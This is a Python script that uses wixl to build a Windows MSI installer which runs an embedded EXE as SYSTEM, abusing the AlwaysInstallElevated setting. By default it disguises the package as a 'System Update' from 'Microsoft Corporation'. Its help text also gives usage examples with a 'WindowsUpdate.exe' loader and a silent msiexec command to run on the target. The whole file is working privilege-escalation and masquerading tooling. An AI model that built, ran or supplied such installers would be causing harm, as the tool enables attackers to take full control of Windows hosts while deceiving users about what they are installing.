#!/usr/bin/env python3

import argparse
import shutil
import subprocess
import sys
import uuid
from pathlib import Path


WXS_TEMPLATE = """<?xml version="1.0" encoding="UTF-8"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
    <Product Id="*"
             Name="{product_name}"
             Language="1033"
             Version="1.0.0.0"
             Manufacturer="{manufacturer}"
             UpgradeCode="{upgrade_code}">
        <Package InstallerVersion="200"
                 Compressed="yes"
                 InstallScope="perMachine"
                 Description="{product_name} Installer" />

        <MediaTemplate EmbedCab="yes" />

        <Binary Id="payload" SourceFile="{exe_source}" />

        <CustomAction Id="RunPayload"
                      BinaryKey="payload"
                      ExeCommand=""
                      Execute="deferred"
                      Impersonate="no"
                      Return="asyncNoWait" />

        <InstallExecuteSequence>
            <Custom Action="RunPayload" After="InstallInitialize" />
        </InstallExecuteSequence>

        <Directory Id="TARGETDIR" Name="SourceDir" />
    </Product>
</Wix>
"""


def check_wixl() -> None:
    if shutil.which("wixl") is None:
        sys.exit("[-] wixl not found. Install: sudo apt install msitools")


def build_msi(exe_path: Path, output_msi: Path,
              product_name: str, manufacturer: str,
              keep_wxs: bool) -> None:
    check_wixl()

    if not exe_path.is_file():
        sys.exit(f"[-] EXE not found: {exe_path}")

    upgrade_code = str(uuid.uuid4()).upper()

    wxs = WXS_TEMPLATE.format(
        product_name=product_name,
        manufacturer=manufacturer,
        upgrade_code=upgrade_code,
        exe_source=str(exe_path.resolve()),
    )

    wxs_path = output_msi.with_suffix(".wxs")
    wxs_path.write_text(wxs)
    print(f"[+] Wrote WiX source: {wxs_path}", file=sys.stderr)

    cmd = ["wixl", "-v", "-o", str(output_msi), str(wxs_path)]
    print(f"[+] Running: {' '.join(cmd)}", file=sys.stderr)
    res = subprocess.run(cmd, capture_output=True, text=True)
    if res.returncode != 0:
        print(res.stdout, file=sys.stderr)
        print(res.stderr, file=sys.stderr)
        sys.exit(f"[-] wixl failed with code {res.returncode}")

    if not keep_wxs:
        wxs_path.unlink()

    size = output_msi.stat().st_size
    print(f"[+] Product name:    {product_name}", file=sys.stderr)
    print(f"[+] Manufacturer:    {manufacturer}", file=sys.stderr)
    print(f"[+] UpgradeCode:     {{{upgrade_code}}}", file=sys.stderr)
    print(f"[+] Embedded EXE:    {exe_path}", file=sys.stderr)
    print(f"[+] Wrote MSI:       {output_msi} ({size} bytes)", file=sys.stderr)
    print("[+] On target (with AlwaysInstallElevated = 1):", file=sys.stderr)
    print(f"    msiexec /quiet /qn /i {output_msi.name}", file=sys.stderr)


def main():
    ap = argparse.ArgumentParser(
        description="Build MSI that runs an EXE as SYSTEM via AlwaysInstallElevated",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
EXAMPLES:

  Basic:
    python3 build_msi.py --exe ../loader/WindowsUpdate.exe

  Custom metadata:
    python3 build_msi.py --exe ./payload.exe \\
        --product-name "Corporate Toolkit" \\
        --manufacturer "IT Services" \\
        -o corporate_toolkit.msi

On target (both HKCU and HKLM AlwaysInstallElevated must be 1):
    msiexec /quiet /qn /i C:\\Users\\Public\\payload.msi
""",
    )
    ap.add_argument("--exe", required=True,
                    help="EXE to embed and run at install time")
    ap.add_argument("-o", "--output", default="installer.msi",
                    help="Output .msi path (default installer.msi)")
    ap.add_argument("--product-name", default="System Update",
                    help='Product Name shown in MSI (default "System Update")')
    ap.add_argument("--manufacturer", default="Microsoft Corporation",
                    help='Manufacturer shown in MSI (default "Microsoft Corporation")')
    ap.add_argument("--keep-wxs", action="store_true",
                    help="Keep intermediate .wxs file (default: deleted after build)")
    args = ap.parse_args()

    build_msi(
        exe_path=Path(args.exe),
        output_msi=Path(args.output),
        product_name=args.product_name,
        manufacturer=args.manufacturer,
        keep_wxs=args.keep_wxs,
    )


if __name__ == "__main__":
    main()
